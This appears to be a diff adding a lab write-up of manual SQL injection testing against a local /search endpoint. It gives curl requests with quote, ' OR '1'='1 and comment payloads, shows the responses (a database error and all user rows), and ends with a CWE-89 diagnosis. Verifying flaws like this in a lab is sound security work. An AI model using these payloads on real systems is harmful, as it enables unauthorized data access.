@@ -1,0 +1,30 @@
+Manual SQL injection verification - /search?q= parameter
+Date: 2026-11-07
+Target: http://lab03.local:5000/search
+
+Test 1 - Baseline
+$ curl -s "http://lab03.local:5000/search?q=admin"
+<h1>Search results</h1><p>admin - admin@lab.local</p>
+
+Test 2 - Quote test (q=')
+$ curl -s "http://lab03.local:5000/search?q=%27"
+<h1>Search results</h1><p>SQL Error - unrecognized token: "''"</p>
+
+Test 3 - Boolean test (q=' OR '1'='1)
+$ curl -s "http://lab03.local:5000/search?q=%27%20OR%20%271%27%3D%271"
+<h1>Search results</h1><p>admin - admin@lab.local</p><p>alice - alice@lab.local</p><p>bob - bob@lab.local</p>
+
+Test 4 - Comment test (q=admin' -- )
+$ curl -s "http://lab03.local:5000/search?q=admin%27%20--%20"
+<h1>Search results</h1><p>admin - admin@lab.local</p>
+
+Conclusion:
+- The quote test breaks the SQL syntax and returns a raw database error,
+  confirming the input is concatenated directly into the query.
+- The boolean test ' OR '1'='1 returns all three rows in the users table
+  instead of the single expected match, confirming the WHERE clause can be
+  bypassed.
+- The comment test confirms trailing query content can be neutralized with
+  an inline SQL comment.
+- This is classic string-concatenation SQL injection (CWE-89) in the
+  /search route, reproduced with SQLite as the back-end DBMS.
